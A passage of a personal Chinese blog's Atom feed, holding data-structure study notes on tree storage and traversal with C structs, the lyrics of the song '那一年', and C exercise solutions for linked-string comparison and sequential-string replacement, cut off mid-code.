    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="树型结构"><a href="#树型结构" class="headerlink" title="树型结构"></a>树型结构</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>树：n &gt;= 0  个结点的有限集合，一棵树是由根和它的子树构成，子树又由子树的根和更小的子树构成。</p><p>空树：n = 0</p><p>森林：一棵树中每个结点的子树多构成的集合，即在森林中的每棵树加上一个共同的根，森林就成为了一颗树。</p><hr><p>上端结点、下端结点</p><p>双亲（父母、前件）</p><p>子女（孩子、后件）</p><p>兄弟</p><p>祖先</p><p>子孙</p><hr><p>某结点的度：该结点所拥有的子女数</p><p>树的度：树中所有结点度的最大值</p><p>树枝：树中连接两个结点的线段</p><p>树的深度（高度）：树的层次数</p><hr><p>终端结点（叶子结点）：度为 0 的结点</p><p>非终端结点（分支结点）：度不为 0 的结点</p><p>路径：从某结点开始沿着自上而下的顺序到达另一个结点，称该路径</p><p>路径的长度：是所经过的树枝的条数</p><p>树形结构的表示方法：括号表示法、嵌套集合表示法、凹入表示法</p><p><img src="https://i.loli.net/2021/10/30/Jl2scUvpjQnIqAu.png" alt="image-20211030152824457"></p><p><img src="https://i.loli.net/2021/10/30/cdGO7smFBlHT1k4.png" alt="image-20211030152839890"></p><p><img src="https://i.loli.net/2021/10/30/g9nOytLS2KNFMhT.png" alt="image-20211030152926106"></p><p><img src="https://i.loli.net/2021/10/30/lPRDXKLTpjYtf9s.png" alt="image-20211030152853872"></p><hr><p>有序树</p><p>无序树</p><p>例：下面的树，若看成是有序树则不相等；若肯成是无序树，则可看作是相等的。</p><p><img src="https://i.loli.net/2021/10/30/myhJ65nSTzoePEK.png" alt="image-20211030152648707"></p><h2 id="1-2-树的存储结构"><a href="#1-2-树的存储结构" class="headerlink" title="1.2 树的存储结构"></a>1.2 树的存储结构</h2><h3 id="1-2-1-双亲表示法-—–-一维数组"><a href="#1-2-1-双亲表示法-—–-一维数组" class="headerlink" title="1.2.1 双亲表示法 —– 一维数组"></a>1.2.1 双亲表示法 —– 一维数组</h3><p>data  parent</p><p>根结点 双亲 值 定义为 -1，root 位置定为 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;   <span class="comment">//根据树中结点的具体类型进行定义，这里我们假设是字符型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;<span class="comment">//结点的类型</span></span><br><span class="line">    <span class="keyword">int</span> parent;<span class="comment">//结点双亲的下表</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tree</span>&#123;</span></span><br><span class="line">    node treelist[MAXSIZE];<span class="comment">//存放结点的数组</span></span><br><span class="line">    <span class="keyword">int</span> length,root;   <span class="comment">//树中实际所含结点的个数  根结点的位置</span></span><br><span class="line">&#125;tree;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/oeaRhzFCUY5O8ws.png" alt="image-20211030154321554"></p><h3 id="1-2-2-孩子表示法-—–-三种"><a href="#1-2-2-孩子表示法-—–-三种" class="headerlink" title="1.2.2 孩子表示法 —– 三种"></a>1.2.2 孩子表示法 —– 三种</h3><p><strong>指针方式 孩子表示法</strong> —- <strong>指针数组</strong></p><p>每个结点：两个域</p><p>值域：data </p><p>指针数组（每个元素是一个指向该结点子女的指针）：child[m]</p><p>度为m的树，其指针数组的大小即是 m</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> m 3  <span class="comment">//树的度数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">child</span>[<span class="title">m</span>];</span> <span class="comment">//指向子女的指针数组</span></span><br><span class="line">&#125;node,*tree;</span><br><span class="line"></span><br><span class="line">tree root;<span class="comment">//指向树根结点的指针</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/SeQ3faz8ACvqj2R.png" alt="image-20211030154722206"></p><p><strong>数组方式 孩子表示法</strong> —- <strong>一维数组</strong></p><p>每个结点：域个数不定</p><p>值域：data</p><p>一维数组：child[m]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> m 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> child[m];</span><br><span class="line">&#125;treenode;</span><br><span class="line"></span><br><span class="line">treenode tree[MAXSIZE]; <span class="comment">//存储树结点的数组</span></span><br><span class="line"><span class="keyword">int</span> root;  <span class="comment">//根结点 下标</span></span><br><span class="line"><span class="keyword">int</span> length; <span class="comment">//树中实际所含结点个数</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/pBfqKovTHn976gs.png" alt="image-20211030155400513"></p><blockquote><p><strong>指针方式和数组方式孩子表示法缺点：</strong></p><p>每个结点所含子女个数不知道，不相同，则 child 数组的大小仅仅由 树的度决定，则会造成 空间的闲置与浪费。</p><p><strong>解决：链表方式孩子表示法</strong></p></blockquote><p><strong>链表方式 孩子表示法</strong></p><p>每个结点：两个域</p><p>值域：data</p><p>指针域（指向该结点的第一个子女）</p><p>每个结点子女 又 排列起来形成一个单链表，n 个结点 n 个单链表</p><p>再使用数组存储单链表的头指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">chnode</span>&#123;</span>  <span class="comment">//孩子结点类型：单链表</span></span><br><span class="line">    <span class="keyword">int</span> child;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chnode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;chnode,*chpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>    <span class="comment">//树中每个结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    chpoint firstchild;<span class="comment">//指向第一个子女结点的指针</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span><span class="comment">//树的类型</span></span><br><span class="line">    node treelist[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length,root;  <span class="comment">//树中实际所含结点个数、根结点的位置</span></span><br><span class="line">&#125;tree;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/CgNt4ZrSkA6UiKM.png" alt="image-20211030160016424"></p><blockquote><p><strong>链表方式孩子表示法</strong> 虽然可以建立动态的链表，但是又要额外需要空间来存放一个指向下一个子女的指针 next，<strong>又增加了空间的开销</strong>。</p></blockquote><p>应根据实际情况进行存储方式的选择。</p><h3 id="1-2-3-孩子兄弟表示法-（二叉树表示法）"><a href="#1-2-3-孩子兄弟表示法-（二叉树表示法）" class="headerlink" title="1.2.3 孩子兄弟表示法 （二叉树表示法）"></a>1.2.3 孩子兄弟表示法 （二叉树表示法）</h3><p>每个结点：三个域     </p><p>值域：data</p><p>两个指针域：firstchild  rightchild (分别指向该结点的第一个子女和其右兄弟)  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>  <span class="comment">//树的结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">firstchild</span>,*<span class="title">rightsibling</span>;</span>  <span class="comment">//第一个子女、右兄弟</span></span><br><span class="line">&#125;node,*pnode;</span><br><span class="line"></span><br><span class="line">pnode root; <span class="comment">//指向树根结点的指针</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/VIs7XdeYLw5HTfx.png" alt="image-20211030161221026"></p><h2 id="1-3-树的遍历"><a href="#1-3-树的遍历" class="headerlink" title="1.3 树的遍历"></a>1.3 树的遍历</h2><p>按照某种规定的顺序访问树中每一个结点，且每个结点仅仅只能访问一次</p><h3 id="1-3-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-3-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.3.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.3.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><h3 id="1-3-2-后序遍历-—-左-gt-右-gt-根"><a href="#1-3-2-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.3.2 后序遍历 —- 左-&gt;右-&gt;根"></a>1.3.2 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><h3 id="1-3-3-层次遍历-—-上至下，左至右"><a href="#1-3-3-层次遍历-—-上至下，左至右" class="headerlink" title="1.3.3 层次遍历 —- 上至下，左至右"></a>1.3.3 层次遍历 —- <code>上至下，左至右</code></h3><p><img src="https://i.loli.net/2021/10/30/52LIEUyk7gorXsZ.png" alt="image-20211030162231970"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>那一年</title>
    <link href="https://xizhi-future.github.io/2021/10/26/%E9%82%A3%E4%B8%80%E5%B9%B4/"/>
    <id>https://xizhi-future.github.io/2021/10/26/%E9%82%A3%E4%B8%80%E5%B9%B4/</id>
    <published>2021-10-26T13:00:00.000Z</published>
    <updated>2021-10-26T13:07:43.969Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>​        那一年放肆的自由</p><p>　　就这样牵起你的手</p><p>　　不懂什么温柔不顾你的感受</p><p>　　寂寞总把我冲昏头</p><p>　　是你体谅我的任性要求</p><p>　　在别人都放弃了我以后</p><p>　　沉默的心为你再次悸动</p><p>　　浩瀚宇宙美不胜收</p><p>　　只是我不配再把你拥有</p><p>　　当你独自面对回忆汹涌</p><p>　　那一年雪都下的很沉重</p><p>　　不敢回头明知你泪在流</p><p>　　泛黄的日记写永久</p><p>　　讽刺我现在才会懂</p><p>　　怀念你的温柔还有什么感受</p><p>　　寂寞让我习惯了痛</p><p>　　是你体谅我的任性要求</p><p>　　在别人都放弃了我以后</p><p>　　沉默的心为你再次悸动</p><p>　　浩瀚宇宙美不胜收</p><p>　　只是我不配再把你拥有</p><p>　　当你独自面对回忆汹涌</p><p>　　那一年雪都下的很沉重</p><p>　　不敢回头明知你泪在流</p><p>　　我们爱到尽头谁都不肯放手</p><p>　　不如坏人就由我担当承受</p><p>　　不管你懂不懂我成全的疼痛</p><p>　　是你体谅我的任性要求</p><p>　　在别人都放弃了我以后</p><p>　　沉默的心为你再次悸动</p><p>　　浩瀚宇宙美不胜收</p><p>　　只是我不配把你拥有</p><p>　　当你独自面对回忆汹涌</p><p>　　那一年雪都下的很沉重</p><p>　　不敢回头明知你泪在流</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>第四章、第五章习题（字符串、数组、矩阵）</title>
    <link href="https://xizhi-future.github.io/2021/10/26/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%81%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%B9%A0%E9%A2%98%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E7%9F%A9%E9%98%B5%EF%BC%89/"/>
    <id>https://xizhi-future.github.io/2021/10/26/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%81%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%B9%A0%E9%A2%98%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E7%9F%A9%E9%98%B5%EF%BC%89/</id>
    <published>2021-10-26T12:51:29.000Z</published>
    <updated>2021-10-26T12:52:59.347Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="1-试编写一个函数，实现在-链式存储方式-下字符串的-strcompare-S1-S2"><a href="#1-试编写一个函数，实现在-链式存储方式-下字符串的-strcompare-S1-S2" class="headerlink" title="1. 试编写一个函数，实现在 链式存储方式 下字符串的 strcompare(S1,S2)"></a>1. 试编写一个函数，实现在 <code>链式存储方式</code> 下字符串的 <code>strcompare(S1,S2)</code></h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//进行比较</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(linkstrnode *S1,linkstrnode *S2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S1 &amp;&amp; S2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S1-&gt;data &gt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(S1-&gt;data &lt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        S1 = S1-&gt;next;</span><br><span class="line">        S2 = S2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(S1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(S2)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linkstrnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> linkstrnode *linkstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建单链表  尾插法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">strcreate</span><span class="params">(linkstring *S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    linkstrnode *p,*r;</span><br><span class="line">    *S = <span class="literal">NULL</span>;</span><br><span class="line">    r = <span class="literal">NULL</span>; <span class="comment">//r始终指向当前链式串最后一个字符对应的结点</span></span><br><span class="line">    <span class="keyword">while</span>((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (linkstrnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linkstrnode));</span><br><span class="line">        p-&gt;data = ch;</span><br><span class="line">        <span class="keyword">if</span>(*S == <span class="literal">NULL</span>) <span class="comment">//本为空表</span></span><br><span class="line">            *S = p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = p; <span class="comment">//不为空表</span></span><br><span class="line">        r = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>; <span class="comment">//处理尾结点指针域</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(linkstring head)</span></span>&#123;</span><br><span class="line">    linkstrnode *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//进行比较</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(linkstrnode *S1,linkstrnode *S2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S1 &amp;&amp; S2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S1-&gt;data &gt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(S1-&gt;data &lt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        S1 = S1-&gt;next;</span><br><span class="line">        S2 = S2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(S1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(S2)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    linkstring s1,s2;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入第一个字符串 s1：&quot;</span>);</span><br><span class="line">    strcreate(&amp;s1);</span><br><span class="line">    print(s1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入第二个字符串 s2：&quot;</span>);</span><br><span class="line">    strcreate(&amp;s2);</span><br><span class="line">    print(s2);</span><br><span class="line">    k = strcompare(s1,s2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n比较的结果为：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(k == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 &gt; s2&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(k == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 &lt; s2&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 == s2&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/OAhsKJBz8ECf54n.png" alt="image-20211022180148858"></p><h2 id="2-试编写一个函数，实现在-顺序存储方式-下字符串的-replace-S-T1-T2-运算"><a href="#2-试编写一个函数，实现在-顺序存储方式-下字符串的-replace-S-T1-T2-运算" class="headerlink" title="2. 试编写一个函数，实现在 顺序存储方式 下字符串的 replace(S,T1,T2) 运算"></a>2. 试编写一个函数，实现在 <code>顺序存储方式</code> 下字符串的 <code>replace(S,T1,T2)</code> 运算</h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//replace 运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replace</span><span class="params">(seqstring *s,seqstring t1,seqstring t2,<span class="keyword">int</span> next[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,c,m;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; s-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">-1</span> || s-&gt;str[i] == t1.str[j])</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j == t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            c = i-t1.length;</span><br><span class="line">            <span class="keyword">if</span>(t1.length == t2.length)</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(t1.length &lt; t2.length)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = s-&gt;length<span class="number">-1</span>;m &gt; i<span class="number">-1</span>;m--)</span><br><span class="line">                    s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k &lt; t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length-t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = i<span class="number">-1</span>;m &lt; s-&gt;length;m++)</span><br><span class="line">                    s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length - t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i = i+t2.length - t1.length;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 